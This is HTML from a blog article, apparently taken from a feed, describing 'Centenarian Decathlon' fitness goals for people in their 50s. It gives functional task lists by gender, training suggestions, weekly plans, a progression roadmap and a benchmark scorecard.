-<h2 id="common-events-in-the-centenarian-decathlon">Common Events in the Centenarian Decathlon</h2>
-<p>Each person’s list is personal, but certain functional activities tend to matter most. These examples are broken down by gender for someone in their 50s planning ahead.</p>
-<h3 id="males">Males</h3>
-<ol>
-<li>Lift and place a 30–40 lb suitcase in an overhead bin.</li>
-<li>Carry two grocery bags (20–30 lbs each).</li>
-<li>Get off the floor unassisted.</li>
-<li>Climb 2–3 flights of stairs without stopping.</li>
-<li>Pick up a child or grandchild (25–40 lbs).</li>
-<li>Walk briskly for 1–2 miles.</li>
-<li>Push open heavy doors or move objects around the house.</li>
-<li>Perform yardwork or shovel snow safely.</li>
-<li>Balance on one leg for 30 seconds.</li>
-<li>Hike 2–3 hours on uneven terrain with a light pack.</li>
-</ol>
-<h3 id="females">Females</h3>
-<ol>
-<li>Lift and carry 15–25 lbs (laundry basket, suitcase, or child).</li>
-<li>Carry grocery bags (10–15 lbs each).</li>
-<li>Get up from the floor unassisted.</li>
-<li>Climb stairs while holding a small load.</li>
-<li>Lift and place an object overhead (like a bag of flour).</li>
-<li>Walk briskly for 1–2 miles.</li>
-<li>Balance on one leg for 30 seconds.</li>
-<li>Pick up a grandchild or pet (20–30 lbs).</li>
-<li>Do household tasks requiring stamina.</li>
-<li>Enjoy recreational hikes or walks on uneven ground.</li>
-</ol>
-<h2 id="training-in-your-50s-building-the-foundation">Training in Your 50s: Building the Foundation</h2>
-<p>Your 50s are a <strong>critical decade</strong> for building the reserve capacity that will carry you through the natural decline of later years. Think of it as making a deposit into your future health bank.</p>
-<h3 id="males-50s">Males (50s)</h3>
-<ul>
-<li><strong>Strength</strong>: Deadlifts, squats, pull-ups, farmer’s carries, overhead press.</li>
-<li><strong>Mobility</strong>: Turkish get-ups, floor-to-stand drills, deep stretches.</li>
-<li><strong>Endurance</strong>: Zone 2 cardio (brisk walking, cycling, rowing) 3–5× weekly.</li>
-<li><strong>Balance</strong>: Single-leg stance, heel-to-toe walking, Tai Chi.</li>
-</ul>
-<h3 id="females-50s">Females (50s)</h3>
-<ul>
-<li><strong>Strength</strong>: Squats, dumbbell presses, kettlebell deadlifts, rows.</li>
-<li><strong>Mobility</strong>: Sit-to-stand practice, Turkish get-ups, yoga.</li>
-<li><strong>Endurance</strong>: Brisk walking, swimming, or elliptical, 3–5× weekly.</li>
-<li><strong>Balance</strong>: Cushion stands, dance, Pilates, or Tai Chi.</li>
-</ul>
-<h2 id="weekly-training-blueprints">Weekly Training Blueprints</h2>
-<h3 id="comprehensive-plan-56-days">Comprehensive Plan (5–6 Days)</h3>
-<ul>
-<li><strong>Strength training</strong>: Alternate upper/lower body sessions.</li>
-<li><strong>Cardio (Zone 2)</strong>: 45–60 minutes, 2–3× per week.</li>
-<li><strong>Mobility &amp; balance</strong>: 10–15 minutes daily.</li>
-<li><strong>Weekend activity</strong>: Outdoor hike, cycling, or sports that involve uneven terrain and real-world movement.</li>
-</ul>
-<h3 id="minimalist-plan-3-days">Minimalist Plan (3 Days)</h3>
-<ul>
-<li><strong>Day 1 – Strength Foundation</strong>: Deadlifts, presses, rows, carries.</li>
-<li><strong>Day 2 – Endurance + Balance</strong>: Zone 2 cardio + single-leg balance work.</li>
-<li><strong>Day 3 – Functional Strength</strong>: Turkish get-ups, step-ups, squat-to-press.</li>
-</ul>
-<h2 id="progression-roadmap-50s-70s">Progression Roadmap: 50s → 70s</h2>
-<ul>
-<li><strong>50s: Build capacity.</strong> Focus on heavier lifts, endurance, and mobility.</li>
-<li><strong>60s: Preserve and refine.</strong> Maintain strength, increase recovery time, and prioritize durability.</li>
-<li><strong>70s: Maintain independence.</strong> Focus on lighter loads, fall prevention, and mobility for daily living.</li>
-</ul>
-<p>The principle is clear: <em>build a surplus of strength and endurance now so you have plenty to draw from later.</em></p>
-<h2 id="self-assessment-scorecard">Self-Assessment: Scorecard</h2>
-<p>A simple <strong>fitness report card</strong> can help you track readiness. Re-test every 6 months to monitor progress.</p>
-<table>
-<thead>
-<tr>
-<th>Test / Benchmark</th>
-<th>Males (50s)</th>
-<th>Females (50s)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Deadlift (5 reps)</strong></td>
-<td>1.25× bodyweight</td>
-<td>1.0× bodyweight</td>
-</tr>
-<tr>
-<td><strong>Farmer’s Carry</strong></td>
-<td>50% bodyweight each hand, 40m</td>
-<td>25% bodyweight each hand, 30m</td>
-</tr>
-<tr>
-<td><strong>Sit-to-Stand (30 sec)</strong></td>
-<td>15 reps</td>
-<td>12 reps</td>
-</tr>
-<tr>
-<td><strong>1-Mile Walk</strong></td>
-<td>≤ 15 minutes</td>
-<td>≤ 16 minutes</td>
-</tr>
-<tr>
-<td><strong>Single-Leg Balance (eyes closed)</strong></td>
-<td>10 seconds</td>
-<td>5 seconds</td>
-</tr>
-</tbody>
-</table>
-<h2 id="why-it-matters">Why It Matters</h2>
-<p>The Centenarian Decathlon isn’t about aesthetics or chasing athletic records — it’s about living better today while preparing for tomorrow. By training strength, mobility, endurance, and balance, you unlock more energy, fewer aches, deeper sleep, and the freedom to fully enjoy everyday life right now.</p>
 <hr>
 <p>Thank you for reading!</p>
 <p>This article was written by Ramiro Gómez using open source software and the assistance of AI tools. While I strive to ensure accurate information, please verify any details independently before taking action. For more articles, visit the <a href="https://geeksta.net/geeklog/">Geeklog on geeksta.net</a>.</p>        ]]></content:encoded>
